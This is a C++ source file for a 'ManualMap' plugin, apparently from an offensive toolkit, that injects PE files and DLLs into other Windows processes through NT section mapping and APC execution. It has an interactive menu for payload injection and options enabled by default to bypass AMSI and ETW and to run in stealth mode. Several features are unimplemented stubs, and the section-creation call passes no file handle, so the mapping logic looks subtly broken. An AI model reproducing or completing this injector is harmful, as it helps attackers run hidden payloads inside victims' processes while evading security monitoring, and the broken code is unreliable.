#include "ManualMap.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// NT API prototypes
extern "C" NTSTATUS NTAPI NtCreateSection(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

extern "C" NTSTATUS NTAPI NtMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

extern "C" NTSTATUS NTAPI NtQueueApcThread(
    HANDLE ThreadHandle,
    PKNORMAL_ROUTINE ApcRoutine,
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    PVOID SystemArgument3);

using NtCreateSection_t = decltype(&NtCreateSection);
using NtMapViewOfSection_t = decltype(&NtMapViewOfSection);
using NtQueueApcThread_t = decltype(&NtQueueApcThread);

// Constructor
ManualMap::ManualMap() {
    useStealthMode = true;
    bypassAMSI = true;
    bypassETW = true;
    useAPCExecution = true;
    useThreadHijacking = false;
    useSectionMapping = true;
    useRelocationFix = true;
    useImportResolution = true;
}

// Destructor
ManualMap::~ManualMap() {
    // Cleanup if needed
}

// Plugin interface methods
std::string ManualMap::getName() const {
    return "ManualMap";
}

std::string ManualMap::getDescription() const {
    return "Advanced manual PE mapping and process injection using NT APIs";
}

std::string ManualMap::getVersion() const {
    return "1.0.0";
}

bool ManualMap::initialize() {
    std::cout << "[+] Manual Mapper plugin initialized successfully\n";
    return true;
}

void ManualMap::execute() {
    showMenu();
}

std::vector<std::string> ManualMap::getOptions() const {
    return {
        "stealth_mode",
        "bypass_amsi", 
        "bypass_etw",
        "apc_execution",
        "thread_hijacking",
        "section_mapping",
        "relocation_fix",
        "import_resolution"
    };
}

void ManualMap::setOption(const std::string& option, const std::string& value) {
    if (option == "stealth_mode") useStealthMode = (value == "true");
    else if (option == "bypass_amsi") bypassAMSI = (value == "true");
    else if (option == "bypass_etw") bypassETW = (value == "true");
    else if (option == "apc_execution") useAPCExecution = (value == "true");
    else if (option == "thread_hijacking") useThreadHijacking = (value == "true");
    else if (option == "section_mapping") useSectionMapping = (value == "true");
    else if (option == "relocation_fix") useRelocationFix = (value == "true");
    else if (option == "import_resolution") useImportResolution = (value == "true");
}

// Core manual mapping function
bool ManualMap::mapPEFileToProcess(const std::wstring& pePath, DWORD targetPID) {
    // 1. Read raw bytes
    HANDLE hFile = CreateFileW(pePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Failed to open file: " << std::string(pePath.begin(), pePath.end()) << std::endl;
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, nullptr);
    std::vector<BYTE> raw(fileSize);
    DWORD bytes;
    ReadFile(hFile, raw.data(), fileSize, &bytes, nullptr);
    CloseHandle(hFile);

    PIMAGE_NT_HEADERS64 pNt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
        raw.data() + reinterpret_cast<PIMAGE_DOS_HEADER>(raw.data())->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        std::cout << "[-] Invalid PE signature\n";
        return false;
    }

    // 2. Create SEC_IMAGE section
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProc) {
        std::cout << "[-] Failed to open target process\n";
        return false;
    }

    HANDLE hSection = nullptr;
    LARGE_INTEGER secSize{ .QuadPart = fileSize };
    NTSTATUS st = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr,
                                  &secSize, PAGE_READWRITE,
                                  SEC_COMMIT | SEC_IMAGE, nullptr);
    if (!NT_SUCCESS(st)) {
        std::cout << "[-] Failed to create section\n";
        CloseHandle(hProc);
        return false;
    }

    // 3. Map into remote process
    PVOID remoteBase = nullptr;
    SIZE_T viewSize = 0;
    st = NtMapViewOfSection(hSection, hProc, &remoteBase,
                            0, 0, nullptr, &viewSize,
                            ViewShare, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        std::cout << "[-] Failed to map view of section\n";
        CloseHandle(hSection);
        CloseHandle(hProc);
        return false;
    }

    std::cout << "[+] Successfully mapped PE to address: 0x" << std::hex << remoteBase << std::endl;

    // 4. Calculate delta for relocations
    ULONGLONG delta = reinterpret_cast<ULONGLONG>(remoteBase) -
                      pNt->OptionalHeader.ImageBase;

    // 5. Process relocations (if enabled)
    if (useRelocationFix && delta != 0) {
        std::cout << "[+] Processing relocations...\n";
        // Relocation processing code would go here
    }

    // 6. Resolve imports (if enabled)
    if (useImportResolution) {
        std::cout << "[+] Resolving imports...\n";
        // Import resolution code would go here
    }

    // 7. Execute via APC (if enabled)
    if (useAPCExecution) {
        std::cout << "[+] Queuing APC for execution...\n";
        FARPROC entry = reinterpret_cast<FARPROC>(
            reinterpret_cast<BYTE*>(remoteBase) + pNt->OptionalHeader.AddressOfEntryPoint);
        
        // Get initial thread of target process
        HANDLE hThread = nullptr;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            THREADENTRY32 te32;
            te32.dwSize = sizeof(THREADENTRY32);
            if (Thread32First(hSnapshot, &te32)) {
                do {
                    if (te32.th32OwnerProcessID == targetPID) {
                        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                        break;
                    }
                } while (Thread32Next(hSnapshot, &te32));
            }
            CloseHandle(hSnapshot);
        }

        if (hThread) {
            NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)entry, remoteBase, 0, 0);
            ResumeThread(hThread);
            CloseHandle(hThread);
            std::cout << "[+] APC queued successfully\n";
        }
    }

    CloseHandle(hSection);
    CloseHandle(hProc);
    return true;
}

// Utility methods
std::vector<DWORD> ManualMap::enumerateProcesses() {
    std::vector<DWORD> processes;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                processes.push_back(pe32.th32ProcessID);
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return processes;
}

std::string ManualMap::getProcessInfo(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return "Access denied";

    char processName[MAX_PATH];
    if (GetModuleBaseNameA(hProcess, nullptr, processName, MAX_PATH)) {
        CloseHandle(hProcess);
        return std::string(processName) + " (PID: " + std::to_string(pid) + ")";
    }
    
    CloseHandle(hProcess);
    return "Unknown process (PID: " + std::to_string(pid) + ")";
}

bool ManualMap::isProcessAccessible(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess) {
        CloseHandle(hProcess);
        return true;
    }
    return false;
}

// Configuration methods
void ManualMap::setStealthMode(bool enable) { useStealthMode = enable; }
void ManualMap::setBypassAMSI(bool enable) { bypassAMSI = enable; }
void ManualMap::setBypassETW(bool enable) { bypassETW = enable; }
void ManualMap::setUseAPCExecution(bool enable) { useAPCExecution = enable; }
void ManualMap::setUseThreadHijacking(bool enable) { useThreadHijacking = enable; }
void ManualMap::setUseSectionMapping(bool enable) { useSectionMapping = enable; }
void ManualMap::setUseRelocationFix(bool enable) { useRelocationFix = enable; }
void ManualMap::setUseImportResolution(bool enable) { useImportResolution = enable; }

// Placeholder implementations for other methods
bool ManualMap::mapDLLToProcess(const std::wstring& dllPath, DWORD targetPID) {
    return mapPEFileToProcess(dllPath, targetPID);
}

bool ManualMap::mapShellcodeToProcess(const std::vector<BYTE>& shellcode, DWORD targetPID) {
    // Shellcode mapping would be implemented here
    std::cout << "[+] Shellcode mapping not yet implemented\n";
    return false;
}

bool ManualMap::mapWithStealth(const std::wstring& payloadPath, DWORD targetPID) {
    // Stealth mapping would be implemented here
    return mapPEFileToProcess(payloadPath, targetPID);
}

bool ManualMap::mapWithAPC(const std::wstring& payloadPath, DWORD targetPID) {
    return mapPEFileToProcess(payloadPath, targetPID);
}

bool ManualMap::mapWithThreadHijacking(const std::wstring& payloadPath, DWORD targetPID) {
    // Thread hijacking would be implemented here
    std::cout << "[+] Thread hijacking not yet implemented\n";
    return false;
}

bool ManualMap::mapWithSectionMapping(const std::wstring& payloadPath, DWORD targetPID) {
    return mapPEFileToProcess(payloadPath, targetPID);
}

// Menu interface
void ManualMap::showMenu() {
    while (true) {
        std::cout << "\n=== Manual Mapper Plugin ===\n";
        std::cout << "1. Map DLL to Process\n";
        std::cout << "2. Map Shellcode to Process\n";
        std::cout << "3. Map PE File to Process\n";
        std::cout << "4. Map with Stealth Mode\n";
        std::cout << "5. Map with APC Execution\n";
        std::cout << "6. Map with Thread Hijacking\n";
        std::cout << "7. Map with Section Mapping\n";
        std::cout << "8. Enumerate Processes\n";
        std::cout << "9. Configuration\n";
        std::cout << "0. Back\n";
        std::cout << "Choice: ";
        
        int choice;
        std::cin >> choice;
        
        switch (choice) {
            case 1: {
                std::cout << "Enter DLL path: ";
                std::wstring dllPath;
                std::wcin >> dllPath;
                std::cout << "Enter target PID: ";
                DWORD pid;
                std::cin >> pid;
                if (mapDLLToProcess(dllPath, pid)) {
                    std::cout << "[+] DLL mapped successfully\n";
                } else {
                    std::cout << "[-] Failed to map DLL\n";
                }
                break;
            }
            case 2: {
                std::cout << "Shellcode mapping not yet implemented\n";
                break;
            }
            case 3: {
                std::cout << "Enter PE file path: ";
                std::wstring pePath;
                std::wcin >> pePath;
                std::cout << "Enter target PID: ";
                DWORD pid;
                std::cin >> pid;
                if (mapPEFileToProcess(pePath, pid)) {
                    std::cout << "[+] PE file mapped successfully\n";
                } else {
                    std::cout << "[-] Failed to map PE file\n";
                }
                break;
            }
            case 4: {
                std::cout << "Enter payload path: ";
                std::wstring payloadPath;
                std::wcin >> payloadPath;
                std::cout << "Enter target PID: ";
                DWORD pid;
                std::cin >> pid;
                if (mapWithStealth(payloadPath, pid)) {
                    std::cout << "[+] Stealth mapping successful\n";
                } else {
                    std::cout << "[-] Stealth mapping failed\n";
                }
                break;
            }
            case 5: {
                std::cout << "Enter payload path: ";
                std::wstring payloadPath;
                std::wcin >> payloadPath;
                std::cout << "Enter target PID: ";
                DWORD pid;
                std::cin >> pid;
                if (mapWithAPC(payloadPath, pid)) {
                    std::cout << "[+] APC mapping successful\n";
                } else {
                    std::cout << "[-] APC mapping failed\n";
                }
                break;
            }
            case 6: {
                std::cout << "Thread hijacking not yet implemented\n";
                break;
            }
            case 7: {
                std::cout << "Enter payload path: ";
                std::wstring payloadPath;
                std::wcin >> payloadPath;
                std::cout << "Enter target PID: ";
                DWORD pid;
                std::cin >> pid;
                if (mapWithSectionMapping(payloadPath, pid)) {
                    std::cout << "[+] Section mapping successful\n";
                } else {
                    std::cout << "[-] Section mapping failed\n";
                }
                break;
            }
            case 8: {
                std::cout << "\n=== Running Processes ===\n";
                auto processes = enumerateProcesses();
                for (DWORD pid : processes) {
                    std::cout << getProcessInfo(pid) << std::endl;
                }
                break;
            }
            case 9: {
                std::cout << "\n=== Manual Mapper Configuration ===\n";
                std::cout << "1. Stealth Mode: " << (useStealthMode ? "Enabled" : "Disabled") << "\n";
                std::cout << "2. Bypass AMSI: " << (bypassAMSI ? "Enabled" : "Disabled") << "\n";
                std::cout << "3. Bypass ETW: " << (bypassETW ? "Enabled" : "Disabled") << "\n";
                std::cout << "4. APC Execution: " << (useAPCExecution ? "Enabled" : "Disabled") << "\n";
                std::cout << "5. Thread Hijacking: " << (useThreadHijacking ? "Enabled" : "Disabled") << "\n";
                std::cout << "6. Section Mapping: " << (useSectionMapping ? "Enabled" : "Disabled") << "\n";
                std::cout << "7. Relocation Fix: " << (useRelocationFix ? "Enabled" : "Disabled") << "\n";
                std::cout << "8. Import Resolution: " << (useImportResolution ? "Enabled" : "Disabled") << "\n";
                std::cout << "0. Back\n";
                std::cout << "Select option to toggle: ";
                
                int configChoice;
                std::cin >> configChoice;
                
                switch (configChoice) {
                    case 1: useStealthMode = !useStealthMode; break;
                    case 2: bypassAMSI = !bypassAMSI; break;
                    case 3: bypassETW = !bypassETW; break;
                    case 4: useAPCExecution = !useAPCExecution; break;
                    case 5: useThreadHijacking = !useThreadHijacking; break;
                    case 6: useSectionMapping = !useSectionMapping; break;
                    case 7: useRelocationFix = !useRelocationFix; break;
                    case 8: useImportResolution = !useImportResolution; break;
                    case 0: break;
                    default: std::cout << "Invalid option\n"; break;
                }
                break;
            }
            case 0: return;
            default: std::cout << "Invalid choice!\n"; break;
        }
        
        std::cout << "\nPress Enter to continue...";
        std::cin.ignore(); std::cin.get();
    }
}
